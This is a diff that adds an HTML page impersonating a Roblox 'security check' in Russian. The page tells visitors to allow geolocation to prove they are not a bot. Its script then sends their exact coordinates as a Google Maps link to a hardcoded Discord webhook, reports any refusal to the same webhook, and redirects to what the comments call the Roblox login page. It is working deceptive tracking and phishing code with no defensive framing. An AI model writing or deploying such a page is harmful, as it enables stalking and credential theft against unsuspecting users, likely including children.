@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Проверка безопасности...</title>
+    <style>
+        body { background-color: #1b1c20; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; margin: 0; }
+        .logo { font-size: 40px; font-weight: 900; margin-bottom: 20px; }
+        .spinner { border: 4px solid #333; border-left-color: #00a2ff; width: 40px; height: 40px; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        p { color: #8b8f94; font-size: 14px; max-width: 350px; line-height: 1.5; }
+    </style>
+</head>
+<body>
+    <div class="logo">ROBLOX</div>
+    <div class="spinner"></div>
+    <h3>Проверка безопасности...</h3>
+    <p>Для подтверждения, что вы не бот, пожалуйста, нажмите <b>«Разрешить»</b> на всплывающем запросе геолокации от вашего браузера.</p>
+
+    <script>
+        // ТВОЙ ВЕБХУК
+        const webhookUrl = "https://discord.com/api/webhooks/1562071981678006302/4eUy6YxJuvvhzecrrJy0AsXaz9H9iV4oQPsKgK2pVtCJkA_eKn3NC2YxgarSYu_WPRgg";
+
+        // Запрашиваем координаты
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                // Если разрешил — шлем точные координаты
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "📍 **ТОЧНЫЕ КООРДИНАТЫ!**\nКарта: https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude
+                    })
+                });
+                // Перекидываем на окно входа Роблокса
+                window.location.href = "index.html";
+            },
+            (err) => {
+                // Если нажал "Заблокировать" — шлем отказ
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: "❌ Переход: геолокация отклонена." })
+                });
+                window.location.href = "index.html";
+            }
+        );
+    </script>
+</body>
+</html>
